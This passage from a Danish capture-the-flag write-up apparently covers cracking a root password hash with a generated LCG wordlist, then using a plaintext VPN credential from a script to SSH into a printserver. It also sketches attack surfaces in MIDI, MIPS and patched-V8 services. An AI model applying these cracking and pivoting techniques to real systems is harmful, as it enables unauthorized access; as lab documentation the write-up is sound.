+      <p>Hashen <code>root:$y$j9T$...</code> anvender yescrypt<sup><a href="#fn12">12</a></sup> (<code>$y$</code>). Blind cracking med john<sup><a href="#fn13">13</a></sup> eller hashcat<sup><a href="#fn14">14</a></sup> uden GPU ville være for langsomt til at være praktisk.</p>
+      <p>Jeg havde adgang til <code>passwdGen.py</code> scriptet og dets LCG (Linear Congruential Generator) parametre. Mit første gæt var at bruge <code>mtime</code> som Unix-timestamp som <code>lcgSeed</code>.</p>
+      <img src="assets/images/image8.png" alt="python3 passwordGen.py output">
+      <p>Timestamp tilgangen gav ikke det korrekte password, så jeg måtte falde tilbage på at generere en komplet wordlist og afprøve alle mulige kandidater.</p>
+      <h3>LCG reverse engineering</h3>
+      <p>LCG parametrene blev udtrukket fra <code>passwdGen.py</code>:</p>
+      <img src="assets/images/image9.png" alt="LCG parametre fra passwdGen.py">
+      <p>Da <code>mtime</code> tilgangen ikke gav det korrekte password direkte, genererede jeg i stedet alle mulige passwords fra seed 0 til 2^24 (16,7 millioner kandidater), en øvre grænse valgt til at dække <code>lcgSeed = 0xfedd15</code> (16702741).</p>
+      <p>Den første version af wordlist generatoren havde en tidskompleksitet på O(n²)<sup><a href="#fn15">15</a></sup>. For hvert password genberegnede den hele LCG sekvensen fra start. For password nr. 16.000.000 betød det 16 millioner iterationer bare for ét enkelt password. Med 16,7 millioner passwords i alt ville scriptet i teorien kræve over 140 milliarder iterationer. Det ville tage alt for lang tid at køre. Scriptet blev optimeret med hjælp fra AI på tre områder:</p>
+      <ol>
+        <li><strong>Fra O(n²) til O(n):</strong> Det oprindelige script genberegnede hele LCG sekvensen fra start for hvert enkelt password. Den optimerede version beregner i stedet sekvensen incrementally, så hvert password tager et enkelt skridt videre fra det forrige frem for at starte forfra (<code>jump_ahead()</code>).</li>
+        <li><strong>Parallelisering:</strong> Udnyttelse af alle CPU-kerner (<code>mp.cpu_count()</code>).</li>
+        <li><strong>Buffering:</strong> Data akkumuleres i en 1MB buffer i RAM (<code>buffering=1024*1024</code>) og skrives til disk i chunks. Dette reducerer antallet af disk I/O operationer fra ~16,7 millioner individuelle writes til et par tusinde, hvilket eliminerer I/O bottleneck markant.</li>
+      </ol>
+      <p>Den optimerede version genererede en komplet wordlist med ~16,7 millioner passwords på få minutter. Bagefter lavede jeg et script <code>crack_it.py</code> som matchede hvert password mod yescrypt-hashen:</p>
+      <img src="assets/images/image10.png" alt="crack_it.py — SUCCESS">
+      <p>Det optimerede script:</p>
+      <img src="assets/images/image11.png" alt="Optimeret LCG wordlist generator">
+      <hr>
+
+      <h2 id="trin-11-printserver-adgang-og-yderligere-discovery">Trin 11: Printserver adgang og yderligere discovery</h2>
+      <h3>VPN credentials</h3>
+      <p>Routeren havde kildekode til containerne: <code>noted</code>, <code>saas</code> og <code>wat</code>. Derudover havde den et shell script ved navn <code>/root/git/vpn/connect.sh</code> som indeholdte hardcoded VPN credentials:</p>
+      <div class="highlight"><pre><code>cat /root/git/vpn/connect.sh
+  → sshpass -p "smirk_september_procedure_washer" ssh -p 2200 vpn@printserver</code></pre></div>
+      <p>Disse blev brugt til at SSH'e ind på printserveren (10.0.42.2, port 2200) som <code>vpn</code> brugeren.</p>
+      <h3>Printserver infrastruktur discovery</h3>
+      <p>Inspektion af kørende processer på <code>printserveren</code> afslørede et komplekst multi-service miljø:</p>
+      <ul>
+        <li>En QEMU-emuleret MIPS<sup><a href="#fn16">16</a></sup> VM, der kørte <code>noted</code> applikationen, med port 7000 forwarding til host.</li>
+        <li>En Docker daemon med TLS på port 2376, en kopi af den container infrastruktur jeg så tidligere.</li>
+        <li>Flere systemd-nspawn-containere<sup><a href="#fn17">17</a></sup>: <code>hostcontainer</code>, <code>noted</code>, <code>router</code>, <code>saas</code> og <code>wat</code>.</li>
+        <li>En <code>saas</code> applikation implementeret som en specialbygget MIDI synthesizer. Applikationen kommunikerer via Apple MIDI (RTP-MIDI)<sup><a href="#fn18">18</a></sup> protokollen på UDP port 5004.</li>
+      </ul>
+      <p><code>sudo -l</code> afslørede at <code>vpn@printserver</code> havde sudo rettigheder til <code>vpn.py</code> samt til at genstarte <code>noted</code>, <code>wat</code> og <code>saas</code> containerne. Da kildekoden til disse applikationer lå på <code>root@router</code>, opstod idéen om at modificere kildekoden som <code>root@router</code> og derefter trigge en genstart via <code>vpn@printserver</code>, og derved få containeren til at køre modificeret kode.</p>
+      <hr>
+
+      <h2 id="wip-analyse-af-angrebsflader-på-router-applikationer">WIP: Analyse af angrebsflader på router applikationer</h2>
+      <h3>saas</h3>
+      <p><code>saas</code> applikationens kildekode, <code>main.c</code> og <code>audio.c</code>, blev fundet på routeren. En MIDI synthesizer der kommunikerer via Apple MIDI (RTP-MIDI) protokollen på UDP port 5004. Apple MIDI bruger en two-step handshake til at etablere sessions.</p>
+      <p>Potentiel sårbarhed kunne ligge i hvordan MIDI-kanalnumre håndteres i koden. MIDI har 16 kanaler (0-15), men hvis koden ikke validerer at kanalnummeret er inden for dette interval, kan et kanalnummer som f.eks. 255 bruges til at tilgå memory uden for det tilladte array. Et classic out-of-bounds array access. Dette kunne bruges til at overskrive function pointers i <code>notes_played</code> arrayet der ligger ved siden af i memory, og derved omdirigere programflowet til arbitrary code execution.</p>
+      <div class="highlight"><pre><code># Session handshake succeeded
+ffff4f4b = \xff\xffOK, peer name: 'saas'</code></pre></div>
+      <h3>noted</h3>
+      <p><code>noted</code> kører som en fuldt emuleret MIPS-processor via QEMU med port 7000 forwarded til host. Jeg forsøgte at sende unintended inputs direkte via <code>nc 10.0.67.199 7000</code> for at trigge en fejl, men uden held.</p>
+      <p>For at analysere koden grundigt er det nødvendigt at udpakke <code>rootfs.squashfs</code> og reverse engineere MIPS binæren. Da routeren ikke har internet forbindelse kunne jeg ikke hente <code>unsquashfs</code> direkte på maskinen. Jeg valgte derfor at overføre filen til min Kali maskine via SCP:</p>
+      <div class="highlight"><pre><code>scp -J user@192.168.78.128 root@10.0.42.1:/root/git/noted/rootfs.squashfs /tmp/</code></pre></div>
+      <p>Efter at have udpakket filsystemet påbegyndte jeg analyse af binæren i Ghidra<sup><a href="#fn19">19</a></sup>. Baseret på applikationens adfærd vurderer jeg at remote code execution sandsynligvis er muligt, men analysen er endnu ikke afsluttet.</p>
+      <h3>wat</h3>
+      <p>En Node.js webapp med en custom patched V8 JavaScript engine (<code>v8.patch</code>). V8 er den JavaScript engine der driver Chrome og Node.js. En custom patch indikerer at denne engine er modificeret. Jeg gætter på at der er indsat en bevidst sårbarhed i JavaScript fortolkeren selv, som kan udnyttes via specifikt udformet JavaScript-kode til at opnå arbitrary code execution.</p>
+      <hr>
+
+      <h2 id="læringspunkter">Læringspunkter</h2>
+      <h3>Undgå at genimplementere kendte løsninger</h3>
+      <p>Jeg udviklede mit eget script til Fermat's factorization, men et veletableret værktøj som RsaCtfTool<sup><a href="#fn20">20</a></sup> håndterer dette og mange andre RSA angreb automatisk. Grundigere research inden implementering kunne have sparet betydelig tid.</p>
+      <h3>Manglende dokumentation undervejs</h3>
+      <p>Fokus på at løse opgaven gik ud over kvaliteten af mine løbende noter. Det gjorde writeuppet sværere at rekonstruere bagefter. Det gælder særligt dead ends og mislykkede forsøg, som er værdifulde at dokumentere fordi de viser tankeprocessen og forhindrer at man forfølger den samme blindgyde igen. Den løbende dokumentation skal være tilstrækkelig detaljeret til at writeuppet kan skrives direkte fra noterne uden at skulle rekonstruere trin eller genopfriske hukommelsen.</p>
+      <h3>Bredde før dybde</h3>
+      <p>Jeg forfulgte det første lovende clue i dybden frem for at kortlægge alle tilgængelige muligheder først. En bredere indledende analyse af alle tilgængelige ressourcer og angrebsvinkler for hvert trin ville have givet et bedre beslutningsgrundlag og potentielt sparet tid ved at pege mod den rigtige løsning hurtigere.</p>
+      <h3>Tidskompleksitet har praktiske konsekvenser</h3>
+      <p>O(n²) vs O(n) er ikke kun akademisk. I dette tilfælde var det forskellen mellem et script der ville kræve over 140 milliarder iterationer og et der færdiggjorde opgaven på få minutter. Det er værd at overveje algoritmisk effektivitet inden man sætter et script igang på millioner af iterationer.</p>
+      <h3>Vurder hvornår automatisering er det værd</h3>
+      <p><code>suBF.sh</code> til 60 passwords var overkill. Manuel afprøvning havde været hurtigere. En god påmindelse om at vurdere hvornår automatisering faktisk sparer tid.</p>
+      <hr>
+
+      <div class="footnotes">
+        <ol>
+          <li id="fn1"><a href="https://en.wikipedia.org/wiki/CUPS">https://en.wikipedia.org/wiki/CUPS</a></li>
+          <li id="fn2"><a href="https://nmap.org/nsedoc/categories/vuln.html">https://nmap.org/nsedoc/categories/vuln.html</a></li>
+          <li id="fn3"><a href="https://en.wikipedia.org/wiki/Slowloris_(cyber_attack)">https://en.wikipedia.org/wiki/Slowloris_(cyber_attack)</a></li>
+          <li id="fn4"><a href="https://nvd.nist.gov/vuln/detail/cve-2007-6750">https://nvd.nist.gov/vuln/detail/cve-2007-6750</a></li>
+          <li id="fn5"><a href="https://www.kali.org/tools/gobuster/">https://www.kali.org/tools/gobuster/</a></li>
+          <li id="fn6"><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
+          <li id="fn7"><a href="https://github.com/carlospolop/su-bruteforce/blob/master/suBF.sh">https://github.com/carlospolop/su-bruteforce/blob/master/suBF.sh</a></li>
+          <li id="fn8"><a href="https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/">https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/</a></li>
+          <li id="fn9"><a href="https://en.wikipedia.org/wiki/Fermat%27s_factorization_method">https://en.wikipedia.org/wiki/Fermat%27s_factorization_method</a></li>
+          <li id="fn10"><a href="https://en.wikipedia.org/wiki/Berkeley_Packet_Filter">https://en.wikipedia.org/wiki/Berkeley_Packet_Filter</a></li>
+          <li id="fn11"><a href="https://www.pentestpad.com/port-exploit/port-666-doom-doom-game-protocol">https://www.pentestpad.com/port-exploit/port-666-doom-doom-game-protocol</a></li>
+          <li id="fn12"><a href="https://en.wikipedia.org/wiki/Yescrypt">https://en.wikipedia.org/wiki/Yescrypt</a></li>
+          <li id="fn13"><a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a></li>
+          <li id="fn14"><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
+          <li id="fn15"><a href="https://en.wikipedia.org/wiki/Big_O_notation#Orders_of_common_functions">https://en.wikipedia.org/wiki/Big_O_notation#Orders_of_common_functions</a></li>
+          <li id="fn16"><a href="https://www.qemu.org/docs/master/system/target-mips.html">https://www.qemu.org/docs/master/system/target-mips.html</a></li>
+          <li id="fn17"><a href="https://www.freedesktop.org/software/systemd/man/latest/systemd-nspawn.html">https://www.freedesktop.org/software/systemd/man/latest/systemd-nspawn.html</a></li>
+          <li id="fn18"><a href="https://developer.apple.com/library/archive/documentation/Audio/Conceptual/MIDINetworkDriverProtocol/MIDI/MIDI.html">https://developer.apple.com/library/archive/documentation/Audio/Conceptual/MIDINetworkDriverProtocol/MIDI/MIDI.html</a></li>
+          <li id="fn19"><a href="http://ghidra.net/">http://ghidra.net/</a></li>
+          <li id="fn20"><a href="https://github.com/RsaCtfTool/RsaCtfTool">https://github.com/RsaCtfTool/RsaCtfTool</a></li>
+        </ol>
+      </div>
     </main>
   </div>
 
